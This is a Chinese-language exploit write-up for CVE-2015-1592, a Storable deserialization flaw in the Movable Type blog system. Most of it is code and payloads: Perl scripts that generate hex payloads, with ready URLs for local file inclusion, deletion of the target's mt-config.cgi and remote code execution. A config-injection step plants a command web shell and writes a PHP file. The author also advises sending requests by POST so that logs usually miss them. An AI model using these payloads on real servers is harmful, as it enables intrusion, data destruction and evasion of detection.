## 简介
`movabletype` ，一个基于 `cgi` 的博客系统，在 5 和 6 的部分版本中，存在一个任意文件删除，一个本地文件包含，一个配置文件写入并可命令执行。
### cve编号
```
CVE-2015-1592
```
### 影响版本
```
< 5.2.12
< 6.0.7
使用了 Perl Storable::thaw 的版本
```

### 测试环境
我这里做了个测试环境的 `docker` ，可以测试删除 `mt-config.cgi` 的 `rce`。
```
docker pull n0puple/moveabletype:6.0
```

## 漏洞
### 测试是否存在模块
```
#!/usr/bin/perl

use Storable;

{

    package XXXCHECKXXX;

    sub STORABLE_thaw {
        return 1;
    }

    sub STORABLE_freeze {
        return 1;
    }

}

my $check_obj = bless { ignore => 'this' }, XXXCHECKXXX;
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $check_obj});
$frozen = unpack 'H*', $frozen;
print "LFI test for storable flaw is: $frozen\n";

{
    package DateTime;
    use overload '+' => sub { 'ignored' };
}

my $datetime_loader = bless \{}, DateTime;
$frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $datetime_loader});
$frozen = unpack 'H*', $frozen;
print "Module load test for DateTime presence is: $frozen\n";

{
    package Object::MultiType;
    use overload '+' => sub { 'ignored' };
}

my $object_multitype_loader = bless \{}, Object::MultiType;
$frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({x => $object_multitype_loader});
$frozen = unpack 'H*', $frozen;
print "Module load test for Obect::MultiType presence is: $frozen\n";
```
输出
```
LFI test for storable flaw is: 534552470000000000000003040a0831323334353637380408080803010000000413020b585858434845434b58585801310100000078
Module load test for DateTime presence is: 534552470000000000000003040a0831323334353637380408080803010000001411084461746554696d650403000000000100000078
Module load test for Obect::MultiType presence is: 534552470000000000000003040a0831323334353637380408080803010000001411114f626a6563743a3a4d756c7469547970650403000000000100000078
```
`payload` 为 （测试 `DateTime` 是否存在）
```
http://www.xxx.com/mt-wizard.cgi?__mode=retry&step=configure&config=534552470000000000000003040a0831323334353637380408080803010000001411084461746554696d650403000000000100000078
```

### 本地文件包含
```
#!/usr/bin/perl

use Storable;

{

    package XX_XX_XX_XX_XX_XX_XX_XX_tmp_LocalFileInclusion;

    sub STORABLE_thaw {
        return 1;
    }

    sub STORABLE_freeze {
        return 1;
    }

}

my $data = bless { ignore => 'this' }, XX_XX_XX_XX_XX_XX_XX_XX_tmp_LocalFileInclusion;
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
$frozen =~ s/XX/../g;
$frozen =~ s/_/\//g;
$frozen = unpack 'H*', $frozen;
print "LFI payload for ../../../../../../../../tmp/LocalFileInclusion.pm is: $frozen\n";
```
输出
```
LFI payload for ../../../../../../../../tmp/LocalFileInclusion.pm is: 534552470000000000000003040a0831323334353637380408080813022e2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f746d702f4c6f63616c46696c65496e636c7573696f6e0131
```
`payload` 为
```
http://www.xxx.com/mt-wizard.cgi?__mode=retry&step=configure&config=534552470000000000000003040a0831323334353637380408080813022e2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f746d702f4c6f63616c46696c65496e636c7573696f6e0131
```

### 任意文件删除
```
#!/usr/bin/perl
use Storable;

{
    package CGITempFile;
}

my $unlink_target = "mt-config.cgi";
my $cgitempfile = bless \$unlink_target, "CGITempFile";

my $data = [$cgitempfile];
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
$frozen = unpack 'H*', $frozen;
print "RCE unlink payload requiring CGI: $frozen\n";
```
输出
```
RCE unlink payload requiring CGI: 534552470000000000000003040a08313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769
```
`payload` 为
```
http://www.xxx.com/mt-wizard.cgi?__mode=retry&step=configure&config=534552470000000000000003040a08313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769
```

这个 `unlink` 影响范围非常大，具体影响范围需要进行测试。

### 利用模块 RCE
这个的成功率较低，使用前建议先检查是否存在下面的 `package`，如果不存在应该是不能成功的，这里的 `payload` 并不完整，建议使用 `msf` 的模块。
```
#!/usr/bin/perl
use Storable;

{
    package Object::MultiType;
    use overload '+' => sub { 'ingored' };
}

{
    package Object::MultiType::Saver;
}

{
    package DateTime;
    use overload '+' => sub { 'ingored' };
}

{
    package Try::Tiny::ScopeGuard;
}

my $try_tiny_loader = bless {}, 'DateTime';
my $multitype_saver = bless { c => 'MT::run_app' }, 'Object::MultiType::Saver';
my $multitype_coderef = bless \$multitype_saver, 'Object::MultiType';
my $try_tiny_executor = bless [$multitype_coderef, 'MT;print qq{Content-type: text/plain\n\n};system(q{});' . ('#' x 1025) . "\nexit;"], 'Try::Tiny::ScopeGuard';

my $data = [$try_tiny_loader, $try_tiny_executor];
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
$frozen = unpack 'H*', $frozen;
print "RCE payload requiring Object::MultiType and DateTime: $frozen\n";
```
输出
```
RCE payload requiring Object::MultiType and DateTime: 534552470000000000000003040a0831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b7d293b23232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323230a657869743b
```
`payload` 为
```
http://www.xxx.com/mt-wizard.cgi?__mode=retry&step=configure&config=534552470000000000000003040a0831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b7d293b23232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323230a657869743b
```

### 写入配置文件 getshell
首先使用上面的任意文件删除，删除掉 `mt-config.cgi` ，之后可使用如下 `payload` 写入配置文件
```
http://www.xxx.com/mt-wizard.cgi?__mode=next_step&step=optional&default_language=en_us&email_address_main=x%0aObjectDriver mysql;use CGI;print qq{Content-type: text/plain\n\n};if(my $c = CGI->new()->param('xyzzy')){system($c);};exit;1&set_static_uri_to=%2F&config=5345524700000000000000024800000001000000127365745f7374617469635f66696c655f746f2d000000012f
```
最后的 `shell`
```
http://www.xxx.com/mt.cgi?xyzzy=whoami
```
我们也可以写入 `php` ，`mt` 的系统应该都有 `php` 环境
```
http://www.xxx.com/mt.cgi?xyzzy=echo "<?php phpinfo();?>" > info.php
```
这个就很好使，但是吧，缺点就是会删除掉目标的 `mt-config.php` 慎用。
哦，对，`msf` 带的那个，反正我就没用成功过。
`payload` 中的 `get` 与 `post` 没有区别，这里写的是`get`的，建议使用 `post` 至少日志一般不会被记录。

## 参考链接
- https://github.com/lightsey/cve-2015-1592
- https://www.exploit-db.com/exploits/41697
- https://www.exploit-db.com/exploits/36996
- https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html